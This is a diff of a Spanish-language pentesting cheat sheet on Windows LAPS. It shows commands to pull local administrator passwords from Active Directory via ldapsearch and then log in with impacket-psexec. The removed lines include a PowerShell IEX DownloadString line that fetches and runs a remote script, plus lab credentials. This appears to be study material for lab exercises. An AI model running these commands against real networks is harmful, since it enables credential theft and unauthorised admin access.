@@ -9,18 +9,17 @@ Tags: #Windows #LAPS
 C:\Program Files\LAPS 
 ```
 
-## LASP Forma 1
-
+## LAPS 
 ```bash 
-❯ https://github.com/kfosaaen/Get-LAPSPasswords   # Descargar 'Get-LAPSPasswords.ps1' y transferirlo a la máquina Windows comprometida
-❯ IEX (New-Object Net.WebClient).DownloadString('https://IP/Get-LAPSPasswords.ps1')  # Importar el módulo 
+# Extraer la apassword del usuario Administrator 
+❯ ldapsearch -x -H 'ldap://IP_DC' -D 'Domain\user' -w 'P@$$w0rd123!' -b 'dc=Domain,dc=corp' "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd
 
-❯ Get-LAPSPasswords          # Ejecutar la función para obtener la password de Administrator
+❯ ldapsearch -x -H 'ldap://IP_DC' -D 'user@Domain.corp' -w 'P@$$w0rd123!' -b 'dc=Domain,dc=corp' "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd
+
+NOTA:
+	- LDAP necesita el NetBIOS 'Domain' o FQDN 'Domain.corp'  
 ```
 
-## LAPS Forma 2
 ```bash 
-❯ ldapsearch -x -H 'ldap://192.168.142.122' -D 'hutch\fmcsorley' -w 'CrabSharkJellyfish192' -b 'dc=hutch,dc=offsec' "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd
-
-❯ psexec.py -u administrator -p 'G4$4Yk-2n&x()' 192.168.142.122
+❯ impacket-psexec Domain.corp/Administrator:'AdminP@$$w0rd123!'@<IP> cmd.exe
 ```
